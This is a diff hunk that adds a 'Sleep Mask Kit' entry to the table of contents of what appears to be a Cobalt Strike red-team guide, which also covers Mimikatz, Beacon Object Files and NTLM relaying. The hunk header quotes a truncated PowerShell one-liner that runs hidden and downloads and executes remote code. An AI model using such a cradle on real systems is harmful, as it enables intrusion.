@@ -38,6 +38,7 @@ $ powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstri
     * [Resource Kit](#resource-kit)
     * [Artifact Kit](#artifact-kit)
     * [Mimikatz Kit](#mimikatz-kit)
+    * [Sleep Mask Kit](#sleep-mask-kit)
 * [Beacon Object Files](#beacon-object-files)
 * [NTLM Relaying via Cobalt Strike](#ntlm-relaying-via-cobalt-strike)
 * [References](#references)
